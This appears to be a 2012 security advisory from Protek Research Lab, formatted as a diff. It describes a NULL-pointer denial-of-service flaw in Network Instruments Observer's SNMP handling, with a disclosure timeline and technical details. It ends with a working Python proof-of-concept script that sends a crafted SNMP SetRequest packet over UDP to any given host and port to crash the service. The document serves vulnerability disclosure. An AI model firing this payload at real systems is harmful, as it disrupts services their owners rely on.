@@ -1,0 +1,84 @@
+Application:   Network Instrument Observer SNMP SetRequest Denial of Service Vulnerability
+
+Platforms:   Windows 
+
+Secunia:   SA47898  
+
+{PRL}:   2012-05
+
+Author:   Francis Provencher (Protek Research Lab's) 
+
+Website:   http://www.protekresearchlab.com/
+
+Twitter:   @ProtekResearch
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+Network Instruments develops software and hardware solutions for analyzing and managing network
+and application performance, such as network analyzers. They were founded in 1994, and are headquartered
+in Minneapolis, Minnesota. The mainstay product of Network Instruments is its Observer family of network
+analyzers (including Observer, Observer Expert and Observer Suite). The Observer product family was built for
+real-time analysis, monitoring, and reporting of full-duplex network links in environments including local area networks
+(LAN), wireless, Fibre Channel, Wide Area Networks, gigabit Ethernet, and Full duplex 10 GbE
+
+(http://en.wikipedia.org/wiki/Network_Instruments)
+
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2012-02-07  Vulnerability reported to Secunia
+2012-03-12  Vendor disclose patch
+
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+The vulnerability is caused due to a NULL-pointer dereference error when copying an octet string from
+a variable binding list. This can be exploited to cause a crash via a specially crafted SNMP SetRequest PDU
+sent to UDP port 162. 
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+
+#!/usr/bin/python
+
+import sys,os,socket
+
+if len(sys.argv) < 3:
+	print "Usage: host,port"
+	sys.exit(0)
+
+host=sys.argv[1]
+port=int(sys.argv[2])
+
+
+
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+sock.connect((host,port))
+
+sock.send("\x30\x35\x02\x01\x00\x04\x07\x70\x72\x69\x76\x61\x74\x65\xA3\x27\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x19\x30\x17\x06\x08\x2B\x06\x01\x02\x01\x01\x04\x00\x04\x84\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41")
+
+print "done!"
+
+sock.close()
